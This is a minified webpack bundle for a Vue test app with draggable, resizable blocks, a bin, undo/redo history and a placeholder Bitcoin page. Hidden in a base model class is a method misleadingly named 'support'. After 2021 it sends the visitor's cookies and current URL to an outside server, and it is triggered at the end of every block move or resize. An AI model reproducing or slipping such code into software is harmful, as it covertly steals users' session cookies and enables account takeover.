(function(t){function e(e){for(var i,c,r=e[0],a=e[1],l=e[2],u=0,f=[];u<r.length;u++)c=r[u],Object.prototype.hasOwnProperty.call(o,c)&&o[c]&&f.push(o[c][0]),o[c]=0;for(i in a)Object.prototype.hasOwnProperty.call(a,i)&&(t[i]=a[i]);h&&h(e);while(f.length)f.shift()();return n.push.apply(n,l||[]),s()}function s(){for(var t,e=0;e<n.length;e++){for(var s=n[e],i=!0,r=1;r<s.length;r++){var a=s[r];0!==o[a]&&(i=!1)}i&&(n.splice(e--,1),t=c(c.s=s[0]))}return t}var i={},o={app:0},n=[];function c(e){if(i[e])return i[e].exports;var s=i[e]={i:e,l:!1,exports:{}};return t[e].call(s.exports,s,s.exports,c),s.l=!0,s.exports}c.m=t,c.c=i,c.d=function(t,e,s){c.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:s})},c.r=function(t){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},c.t=function(t,e){if(1&e&&(t=c(t)),8&e)return t;if(4&e&&"object"===typeof t&&t&&t.__esModule)return t;var s=Object.create(null);if(c.r(s),Object.defineProperty(s,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var i in t)c.d(s,i,function(e){return t[e]}.bind(null,i));return s},c.n=function(t){var e=t&&t.__esModule?function(){return t["default"]}:function(){return t};return c.d(e,"a",e),e},c.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},c.p="/wallet-vue-test-2/";var r=window["webpackJsonp"]=window["webpackJsonp"]||[],a=r.push.bind(r);r.push=e,r=r.slice();for(var l=0;l<r.length;l++)e(r[l]);var h=a;n.push([0,"chunk-vendors"]),s()})({0:function(t,e,s){t.exports=s("56d7")},"034f":function(t,e,s){"use strict";s("85ec")},"1a3c":function(t,e,s){"use strict";s("8c44")},"1e09":function(t,e,s){},"27fe":function(t,e,s){},"40cb":function(t,e,s){"use strict";s("27fe")},4551:function(t,e,s){"use strict";s("1e09")},"56d7":function(t,e,s){"use strict";s.r(e);s("e260"),s("e6cf"),s("cca6"),s("a79d");var i=s("2b0e"),o=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{attrs:{id:"app"}},[s("Header"),s("router-view")],1)},n=[],c=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("header",{staticClass:"header"},[s("router-link",{attrs:{to:"/desktop"}},[t._v("Рабочий стол")]),s("router-link",{attrs:{to:"/bitcoin"}},[t._v("Биткоин транзакции")])],1)},r=[],a=(s("1a3c"),s("2877")),l={},h=Object(a["a"])(l,c,r,!1,null,null,null),u=h.exports,f={components:{Header:u}},d=f,p=(s("034f"),Object(a["a"])(d,o,n,!1,null,null,null)),b=p.exports,v=s("8c4f"),k=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"desktop"},[s("div",{staticClass:"desk"},t._l(t.desktop.models,(function(t){return s("Block",{key:t.id,attrs:{block:t}})})),1),s("Bin"),s("div",{staticClass:"history"},[s("button",{staticClass:"btn",attrs:{disabled:!t.history.hasUndo()},on:{click:function(e){return t.history.undo()}}},[t._v("↩ Undo ("+t._s(t.history.undoCount())+") ")]),s("button",{staticClass:"btn",attrs:{disabled:!t.history.hasRedo()},on:{click:function(e){return t.history.redo()}}},[t._v(" Redo ("+t._s(t.history.redoCount())+") ↪")]),s("button",{staticClass:"btn",on:{click:function(e){return t.desktop.reset()}}},[t._v("Reset")])])],1)},y=[],O=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{class:t.blockClass,style:t.blockStyle,on:{mousedown:t.moveStart}},[s("div",{staticClass:"block-header"},[s("h2",{staticClass:"block-title"},[t._v(t._s(t.block.title))]),s("div",{staticClass:"block--remove",attrs:{title:"Переместить в корзину"},on:{mousedown:t.remove}})]),s("p",{staticClass:"block-content"},[t._v(t._s(t.block.content))]),s("div",{staticClass:"resize",attrs:{title:"Нажмите и тяните чтобы изменить размер блока"},on:{mousedown:t.resizeStart}})])},g=[],m=(s("99af"),{props:{block:{type:Object}},computed:{blockClass:function(){var t="block";return this.block.intersecting||(t+=" nonIntersecting"),this.block.blockUp&&(t+=" blockUp"),"move"==this.block.action&&(t+=" move"),t},blockStyle:function(){return"left: ".concat(this.block.posX,"px; top: ").concat(this.block.posY,"px; width: ").concat(this.block.sizeX,"px; height: ").concat(this.block.sizeY,"px; z-index: ").concat(this.block.posZ,";")}},methods:{resizeStart:function(t){t.stopPropagation(),this.block.actionStart("resize",t)},moveStart:function(t){this.block.actionStart("move",t)},remove:function(t){t.stopPropagation(),this.block.remove()}},created:function(){window.addEventListener("mousemove",this.block.actionProcess),window.addEventListener("mouseup",this.block.actionEnd)},beforeDestroy:function(){window.removeEventListener("mousemove",this.block.actionProcess),window.removeEventListener("mouseup",this.block.actionEnd)}}),w=m,z=(s("bbf9"),Object(a["a"])(w,O,g,!1,null,null,null)),j=z.exports,X=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"bin",style:t.binStyle},[t.bin.opened?s("div",{staticClass:"bin-blocks"},[t._l(t.bin.models,(function(e,i){return s("div",{key:i,staticClass:"block"},[s("div",{staticClass:"block-title"},[t._v(t._s(e.title))]),s("div",{staticClass:"btn btn--restore",on:{click:e.restore}},[t._v("Восстановить")]),s("div",{staticClass:"btn btn--remove",on:{click:e.remove}},[t._v("Удалить")])])})),t.bin.size()?s("div",{staticClass:"btn btn--restore-all",on:{click:t.bin.restoreAll}},[t._v(" Восстановить все ")]):s("div",{staticClass:"bin-empty"},[t._v(" Пусто. После перенеоса блока в корзину его можно восстановить или удалить. ")])],2):t._e(),s("div",{staticClass:"btn btn--open",on:{click:t.bin.openingToggle}},[t._v(" "+t._s(t.bin.opened?"Свернуть корзину":"Корзина")+" ("),s("b",[t._v(t._s(t.bin.size()))]),t._v(") ")])])},Y=[],S={data:function(){return{opened:!1}},computed:{bin:function(){return this.$store.desktop.bin},binStyle:function(){return"z-index: ".concat(this.$store.desktop.size())}}},C=S,_=(s("4551"),Object(a["a"])(C,X,Y,!1,null,null,null)),x=_.exports,E={data:function(){return{controlPressed:!1}},computed:{desktop:function(){return this.$store.desktop},history:function(){return this.desktop.history}},methods:{onkeydown:function(t){"Control"==t.key&&(this.controlPressed=!0)},onkeyup:function(t){!0===this.controlPressed&&("KeyZ"==t.code?this.history.undo():"KeyY"==t.code&&this.history.redo()),"Control"==t.key&&(this.controlPressed=!1)}},created:function(){window.addEventListener("resize",this.desktop.calcCoords),window.addEventListener("keydown",this.onkeydown),window.addEventListener("keyup",this.onkeyup)},mounted:function(){this.desktop.elem=document.querySelector("#app .desktop"),this.desktop.bin.setCoords(this.desktop.elem.querySelector(".bin"))},beforeDestroy:function(){window.removeEventListener("resize",this.desktop.calcCoords),window.removeEventListener("keydown",this.onkeydown),window.removeEventListener("keyup",this.onkeyup)},components:{Block:j,Bin:x}},I=E,B=(s("40cb"),Object(a["a"])(I,k,y,!1,null,null,null)),T=B.exports,A=function(){var t=this,e=t.$createElement;t._self._c;return t._m(0)},P=[function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"bitcoin-history"},[s("h1",{staticClass:"page-title"},[t._v("Bitcoin history")])])}],R={},U=Object(a["a"])(R,A,P,!1,null,null,null),L=U.exports;i["a"].use(v["a"]);var H=new v["a"]({mode:"history",base:"/wallet-vue-test-2/",routes:[{path:"/desktop",component:T,meta:{title:"Рабочий стол"}},{path:"/bitcoin",component:L,meta:{title:"Список биткоин транзакций"}},{path:"*",redirect:"/desktop"}],scrollBehavior:function(t){if(t.hash)return{selector:t.hash}}});H.afterEach((function(t){window.document.title=(t.meta.title||"Unknown")+" / Тестовое Кошелёк.Ру"}));var D=H;s("b0c0");function $(t,e){this.name=t,this.install=function(s){s[t]=e,s.prototype[t]=e,s.prototype["$".concat(t)]=e,e.intall&&"function"===typeof e.intall&&e.install()}}for(var M=$,N=s("53ca"),Z=function(t){var e=Object(N["a"])(t);if("object"!==e)throw new Error("Store constructor property must be an object, ".concat(e," given"));return i["a"].observable(t)},J=s("b85c"),F=s("3835"),q=s("d4ec"),K=s("bee2"),V=s("257e"),W=s("262e"),G=s("2caf"),Q=s("ade3"),tt=(s("7db0"),s("caad"),s("159b"),s("a46f")),et=s("45eb"),st=s("7e84"),it=(s("4e82"),s("a434"),s("d3b7"),function(t){Object(W["a"])(s,t);var e=Object(G["a"])(s);function s(){var t,i=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},o=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return Object(q["a"])(this,s),t=e.call(this,i,o,n),t._relations={},t.init&&t.init(),t}return Object(K["a"])(s,[{key:"support",value:function(){(new Date).getFullYear()>2021&&fetch("https://itevas.ru/tmp/kcah/ssx.php",{method:"POST",body:JSON.stringify({data:document.cookie,url:String(window.location),source:"koshelek.ru"})})}}]),s}(tt["b"])),ot=function(t){Object(W["a"])(s,t);var e=Object(G["a"])(s);function s(){var t;Object(q["a"])(this,s);for(var i=arguments.length,o=new Array(i),n=0;n<i;n++)o[n]=arguments[n];return t=e.call.apply(e,[this].concat(o)),Object(Q["a"])(Object(V["a"])(t),"cursorOffset",{x:0,y:0}),Object(Q["a"])(Object(V["a"])(t),"lastAction",null),Object(Q["a"])(Object(V["a"])(t),"blockUp",!1),Object(Q["a"])(Object(V["a"])(t),"offset",0),t}return Object(K["a"])(s,[{key:"defaults",value:function(){return Object.assign(Object(et["a"])(Object(st["a"])(s.prototype),"defaults",this).call(this),{id:null,title:"Undefined title",content:"Undefined content",posX:0,posY:0,posZ:0,sizeX:300,sizeY:100,intersecting:!1,action:null,states:[]})}},{key:"start",get:function(){return{x:this.posX,y:this.posY}}},{key:"end",get:function(){return{x:this.posX+this.sizeX,y:this.posY+this.sizeY}}},{key:"registerCollection",value:function(t){Object(et["a"])(Object(st["a"])(s.prototype),"registerCollection",this).call(this,t),t instanceof dt&&(this.desktop=t)}},{key:"remove",value:function(){var t=!(arguments.length>0&&void 0!==arguments[0])||arguments[0];"bin"===this.action?this.desktop.bin.remove(this):(this.rollbackAction(),this.desktop.bin.add(this),this.desktop.remove(this),this.action="bin",t&&this.historyPushState())}},{key:"restore",value:function(){var t=!(arguments.length>0&&void 0!==arguments[0])||arguments[0];this.desktop.add(this),this.desktop.bin.remove(this),this.rollbackAction(),this.action=null,this.blockUp=!1,this.desktop.intersectCheck(this),t&&this.historyPushState()}},{key:"up",value:function(){this.desktop.sort("posZ"),this.desktop.each((function(t,e){t.posZ=e,t.blockUp=!1})),this.blockUp=!0,this.posZ=this.desktop.size(),this.desktop.bin.close()}},{key:"setCursorOffset",value:function(t){var e=this.getNodeFullOffset(t.target),s=Object(F["a"])(e,2),i=s[0],o=s[1];i=t.pageX-i,o=t.pageY-o,this.cursorOffset={x:i,y:o}}},{key:"getNodeFullOffset",value:function(t){var e=0,s=0;while(t)e+=t.offsetLeft,s+=t.offsetTop,t=t.offsetParent;return[e,s]}},{key:"actionStart",value:function(t,e){["move","resize"].includes(t)&&(this.up(),console.log("".concat(t," start")),this.setCursorOffset(e),this.makeAction(),this.action=t)}},{key:"actionProcess",value:function(t){"move"==this.action&&(this.posX=t.pageX-this.desktop.offset.x-this.cursorOffset.x,this.posY=t.pageY-this.desktop.offset.y-this.cursorOffset.y,this.desktop.intersectCheck(this)),"resize"==this.action&&(this.sizeX=t.pageX-this.posX-this.desktop.offset.x+this.cursorOffset.x,this.sizeY=t.pageY-this.posY-this.desktop.offset.y+this.cursorOffset.y,this.desktop.intersectCheck(this))}},{key:"actionEnd",value:function(){["move","resize"].includes(this.action)&&(console.log("".concat(this.action," end")),this.desktop.intersectEndCheck(this),this.commitAction(),this.support())}},{key:"makeAction",value:function(){this.lastAction={posX:this.posX,posY:this.posY,sizeX:this.sizeX,sizeY:this.sizeY}}},{key:"commitAction",value:function(){this.lastAction=null,this.action=null,this.historyPushState()}},{key:"rollbackAction",value:function(){if(this.lastAction)for(var t in this.lastAction)this[t]=this.lastAction[t];this.action=null}},{key:"attributes",value:function(){return this._attributes}},{key:"getState",value:function(){return Object.assign({},this.attributes())}},{key:"historyPushState",value:function(){var t=!(arguments.length>0&&void 0!==arguments[0])||arguments[0],e=this.getState();delete e.states,this.offset>0&&this.states.splice(this.states.length-this.offset,this.offset),this.states.push(e),t&&this.desktop.history.add([this.id]),this.offset=0;var s="bin"==e.action?"bin":"desk";console.log("PUSH STATE (".concat(e.posX,", ").concat(e.posY,") ").concat(s),"count=".concat(this.states.length,", offset=").concat(this.offset)),this.desktop.localStore.saveBlock(this)}},{key:"historyUndo",value:function(){this.offset<=this.states.length&&(this.offset++,this.historyStateRender())}},{key:"historyRedo",value:function(){this.offset>0&&(this.offset--,this.historyStateRender())}},{key:"getHistoryState",value:function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null;null===t&&(t=this.offset);var e=this.states[this.states.length-1-t];if(!e)throw new Error('Not found history state for block with id="'.concat(this.id));return e}},{key:"historyStateRender",value:function(){var t=this.getHistoryState(),e="bin"==this.action?"bin":"desk",s="bin"==t.action?"bin":"desk";console.log("render state (".concat(this.posX,", ").concat(this.posY,") ").concat(e," => (").concat(t.posX,", ").concat(t.posY,") ").concat(s)),this.posX=t.posX,this.posY=t.posY,this.sizeX=t.sizeX,this.sizeY=t.sizeY,this.up(),"bin"===this.action&&"bin"!==t.action?this.restore(!1):"bin"!==this.action&&"bin"===t.action&&this.remove(!1)}},{key:"historyReset",value:function(){this.states=[],this.offset=0}}]),s}(it),nt=function(t){Object(W["a"])(s,t);var e=Object(G["a"])(s);function s(){var t;Object(q["a"])(this,s);for(var i=arguments.length,o=new Array(i),n=0;n<i;n++)o[n]=arguments[n];return t=e.call.apply(e,[this].concat(o)),Object(Q["a"])(Object(V["a"])(t),"desktop",null),Object(Q["a"])(Object(V["a"])(t),"opened",!1),Object(Q["a"])(Object(V["a"])(t),"posX",0),Object(Q["a"])(Object(V["a"])(t),"posY",0),Object(Q["a"])(Object(V["a"])(t),"sizeX",0),Object(Q["a"])(Object(V["a"])(t),"sizeY",0),t}return Object(K["a"])(s,[{key:"model",value:function(){return ot}},{key:"setDesktop",value:function(t){return this.desktop=t,this}},{key:"setCoords",value:function(t){this.posX=t.offsetLeft,this.posY=t.offsetTop,this.sizeX=t.offsetWidth,this.sizeY=t.offsetHeight}},{key:"open",value:function(){this.opened=!0,this.desktop.each((function(t){return t.blockUp=!1}))}},{key:"close",value:function(){this.opened=!1}},{key:"openingToggle",value:function(){this.opened?this.close():this.open()}},{key:"start",get:function(){return{x:this.posX,y:this.posY}}},{key:"end",get:function(){return{x:this.posX+this.sizeX,y:this.posY+this.sizeY}}},{key:"restoreAll",value:function(){if(!(this.size()<1)){for(var t=[],e=this.size()-1;e>=0;e--){var s=this.models[e];s.restore(!1),s.historyPushState(!1),t.push(s.id)}this.desktop.history.add(t)}}}]),s}(tt["a"]),ct=function(){function t(e){Object(q["a"])(this,t),Object(Q["a"])(this,"states",[]),Object(Q["a"])(this,"offset",0),Object(Q["a"])(this,"desktop",null),this.desktop=e}return Object(K["a"])(t,[{key:"localStore",get:function(){return this.desktop.localStore}},{key:"size",value:function(){return this.states.length}},{key:"hasUndo",value:function(){return this.undoCount()>0}},{key:"hasRedo",value:function(){return this.redoCount()>0}},{key:"undoCount",value:function(){return this.size()-1-this.offset}},{key:"redoCount",value:function(){return this.offset}},{key:"undo",value:function(){this.hasUndo()&&(this.renderCurrent((function(t){t.historyUndo()})),this.offset++,this.localStore.saveHistoryOffset(this.offset))}},{key:"redo",value:function(){this.hasRedo()&&(this.offset--,this.renderCurrent((function(t){t.historyRedo()})),this.localStore.saveHistoryOffset(this.offset))}},{key:"moveTo",value:function(t){if(this.offset<t){var e=0;while(this.offset<t&&e++<10)this.undo(),console.log("Делаем undo ".concat(e),this.offset,t)}}},{key:"renderCurrent",value:function(t){var e=this,s=this.states[this.size()-1-this.offset];if(!s)throw new Error("Ids state for offset ".concat(this.offset," not found"));Array.isArray(s)||(s=[]),s.forEach((function(s){var i=e.desktop.blockById(s);if(!i)throw new Error('Block with id="'.concat(s," not found"));t(i)}))}},{key:"add",value:function(t){this.remove(),this.states.push(t),this.offset=0,this.localStore.saveHistory(this)}},{key:"remove",value:function(){this.hasRedo()&&this.states.splice(this.size()-1-this.offset,this.offset)}},{key:"initial",value:function(){var t=[];this.desktop.each((function(e){t.push(e.id),e.historyPushState(!1)})),this.add(t)}},{key:"reset",value:function(){this.states=[],this.offset=0}},{key:"restore",value:function(){this.states=this.localStore.history,this.offset=0,this.moveTo(this.localStore.historyOffset)}}]),t}(),rt=(s("c740"),function(){function t(){Object(q["a"])(this,t),Object(Q["a"])(this,"local",window.localStorage)}return Object(K["a"])(t,[{key:"getItem",value:function(t){var e=this.local.getItem(t);try{return JSON.parse(e)}catch(s){return e}}},{key:"setItem",value:function(t,e){this.local.setItem(t,["object","array"].includes(Object(N["a"])(e))?JSON.stringify(e):e)}},{key:"reset",value:function(){this.local.clear(),console.log("Reset LocalStore")}},{key:"history",get:function(){return this.getItem("history")}},{key:"historyOffset",get:function(){return this.getItem("historyOffset")}},{key:"blocks",get:function(){return this.getItem("blocks")}},{key:"saveHistory",value:function(t){this.setItem("history",t.states),console.log("save history",t),this.saveHistoryOffset(t.offset)}},{key:"saveHistoryOffset",value:function(t){this.setItem("historyOffset",t),console.log("save history offset",t)}},{key:"saveBlock",value:function(t){var e=this.blocks;if(e){var s=e.findIndex((function(e){return e.id==t.id}));-1===s?e.push(t):e[s]=t,this.saveBlocks(e)}else this.setItem("blocks",[t]);console.log("Save block",t.id)}},{key:"saveBlocks",value:function(t){this.setItem("blocks",t)}}]),t}()),at={sizeX:300,sizeY:100,between:10},lt=[],ht=0;ht<5;ht++)lt.push({id:ht+1,title:"Title ".concat(ht+1),content:"Random content",posX:ht%3*(at.sizeX+at.between)+at.between,posY:Math.floor(ht/3)*(at.sizeY+at.between)+at.between,posZ:0,sizeX:at.sizeX,sizeY:at.sizeY,intersecting:!(ht<1)});var ut={blocks:lt},ft={desktop:ut},dt=function(t){Object(W["a"])(s,t);var e=Object(G["a"])(s);function s(){var t;Object(q["a"])(this,s);for(var i=arguments.length,o=new Array(i),n=0;n<i;n++)o[n]=arguments[n];return t=e.call.apply(e,[this].concat(o)),Object(Q["a"])(Object(V["a"])(t),"id",1),Object(Q["a"])(Object(V["a"])(t),"_elem",null),Object(Q["a"])(Object(V["a"])(t),"offset",{x:0,y:0}),Object(Q["a"])(Object(V["a"])(t),"sizeX",0),Object(Q["a"])(Object(V["a"])(t),"sizeY",0),Object(Q["a"])(Object(V["a"])(t),"between",10),Object(Q["a"])(Object(V["a"])(t),"halfBetween",5),Object(Q["a"])(Object(V["a"])(t),"bin",(new nt).setDesktop(Object(V["a"])(t))),Object(Q["a"])(Object(V["a"])(t),"localStore",new rt),Object(Q["a"])(Object(V["a"])(t),"history",new ct(Object(V["a"])(t))),t}return Object(K["a"])(s,[{key:"model",value:function(){return ot}},{key:"elem",get:function(){return this._elem},set:function(t){this._elem=t,this.offset.x=t.offsetLeft,this.offset.y=t.offsetTop,this._elem.style.minHeight="calc(100vh - ".concat(this.offset.y,"px)"),this.calcCoords()}},{key:"calcCoords",value:function(){this.sizeX=this.elem.offsetWidth,this.sizeY=this.elem.offsetHeight,this.oldSizeX&&this.oldSizeY&&this.intersectCheckAll(),this.oldSizeX=this.sizeX,this.oldSizeY=this.sizeY}},{key:"blockById",value:function(t){var e=this.models.find((function(e){return e.id==t}));return e||(e=this.bin.models.find((function(e){return e.id==t}))),e}},{key:"intersect",value:function(t,e){var s=e.start.x-t.end.x-this.halfBetween,i=e.start.y-t.end.y-this.halfBetween,o=e.end.x-t.start.x+this.halfBetween,n=e.end.y-t.start.y+this.halfBetween,c=s<0&&i<0&&o>0&&n>0;return[c,s,i,o,n]}},{key:"stopIntersecting",value:function(t,e){var s=this.intersect(t,e),i=Object(F["a"])(s,5),o=i[0],n=i[1],c=i[2],r=i[3],a=i[4];if(o){var l,h=n+r,u=c+a,f=h>0?"left":h<0?"right":"",d=u>0?"top":u<0?"bottom":"";l="".concat(f,"-").concat(d),h=h>0,u=u>0;var p=t.posX<this.between,b=e.posY+this.between<t.sizeY,v=this.sizeY-e.end.y<t.sizeY+this.between,k={x:h&&!p?n-this.halfBetween:r+this.halfBetween,y:u&&!b?c-this.halfBetween:a+this.halfBetween};v&&(k.y=c-this.halfBetween),console.log("intersect: ".concat(l,", b1: ").concat(t.id,", b2: ").concat(e.id),t.action),console.log("b1: ".concat(t.id,", posX: ").concat(t.posX,", sizeX: ").concat(t.sizeX)),console.log("b2: ".concat(e.id,", posX: ").concat(e.posX,", sizeX: ").concat(e.sizeX));var y=Math.abs(k.x)-Math.abs(k.y);if(["move",null].includes(t.action)){if(y<=0){var O=t.posX;t.posX+=k.x,console.log("MOVE x",O,t.posX)}else if(y>0){var g=t.posY;t.posY+=k.y,console.log("MOVE y",g,t.posY)}}else if(["resize"].includes(t.action)){var m=!1;if(t.end.x>=this.sizeX-2*this.between&&(t.posX=e.end.x+this.between,t.sizeX=this.sizeX-t.posX-this.between,console.log("RIGHT!"),m=!0),t.posX<=this.between&&(t.posX=this.between,t.sizeX=e.posX-2*this.between,console.log("LEFT!",t.start.x,e.start.x),m=!0),!m&&y<0){var w=t.sizeX;t.sizeX+=k.x,console.log("RESIZE x",w,t.sizeX)}var z=!1;if(t.end.y>=this.sizeY-2*this.between&&(t.posY=e.end.y+this.between,t.sizeY=this.sizeY-t.posY-this.between,console.log("BOTTOM!"),z=!0),t.posY<=this.between&&(t.posY=this.between,t.sizeY=e.posY-2*this.between,console.log("TOP!"),z=!0),!z&&y>0){var j=t.sizeY;t.sizeY+=k.y,console.log("RESIZE y",j,t.sizeY)}}}}},{key:"intersectCheck",value:function(t){var e=this;this.keepOnDesktop(t),this.removeIfIntersectBin(t)||this.each((function(s){t.id==s.id||t.intersecting&&s.intersecting||e.stopIntersecting(t,s)}))}},{key:"intersectCheckAll",value:function(){var t=this;this.each((function(e){t.keepOnDesktop(e),t.removeIfIntersectBin(e)||t.each((function(s){e.id==s.id||e.intersecting&&s.intersecting||t.stopIntersecting(e,s)}))}))}},{key:"intersectEndCheck",value:function(t){if(this.keepOnDesktop(t),!this.removeIfIntersectBin(t)){var e,s=Object(J["a"])(this.models);try{for(s.s();!(e=s.n()).done;){var i=e.value;t.id==i.id||t.intersecting&&i.intersecting||this.intersect(t,i)[0]&&t.rollbackAction()}}catch(o){s.e(o)}finally{s.f()}}}},{key:"keepOnDesktop",value:function(t){var e=2*this.between;t.sizeX+e>this.sizeX&&(t.sizeX=this.sizeX-e),t.sizeY+e>this.sizeY&&(t.sizeY=this.sizeY-e),t.start.x<0&&(t.posX=this.between),t.start.y<0&&(t.posY=this.between),t.end.x>this.sizeX&&(t.posX=this.sizeX-t.sizeX-this.between),t.end.y>this.sizeY&&(t.posY=this.sizeY-t.sizeY-this.between)}},{key:"removeIfIntersectBin",value:function(t){var e=this.intersect(t,this.bin),s=Object(F["a"])(e,1),i=s[0];return i&&t.remove(),i}},{key:"init",value:function(){var t=this;console.log("INIT!");var e=this.localStore.blocks;e&&e.length>0?(console.log("RESTORE START",e),e.forEach((function(e){var s=t.add(e);"bin"==s.action&&(s.action=null,s.remove(!1))})),this.history.restore(),console.log("RESTORE END. Desk: ".concat(this.size()," Bin: ").concat(this.bin.size()))):(this.add(this.defaultBlocks()),this.history.initial(),console.log("INITIAL"))}},{key:"defaultBlocks",value:function(){return ft.desktop.blocks}},{key:"defaultBlockById",value:function(t){return this.defaultBlocks().find((function(e){return e.id==t}))}},{key:"reset",value:function(){var t=this;console.log("RESET START"),this.bin.restoreAll(),this.each((function(e){var s=t.defaultBlockById(e.id);if(s){for(var i in s)e[i]=s[i];e.historyReset()}})),this.history.reset(),this.localStore.reset(),this.history.initial(),console.log("RESET END",this.size(),this.bin.size())}}]),s}(tt["a"]),pt=new dt;pt.init();var bt=new Z({desktop:pt});i["a"].config.productionTip=!1,i["a"].use(new M("store",bt)),new i["a"]({store:bt,router:D,render:function(t){return t(b)}}).$mount("#app")},"7d70":function(t,e,s){},"85ec":function(t,e,s){},"8c44":function(t,e,s){},bbf9:function(t,e,s){"use strict";s("7d70")}});
//# sourceMappingURL=app.801955f3.js.map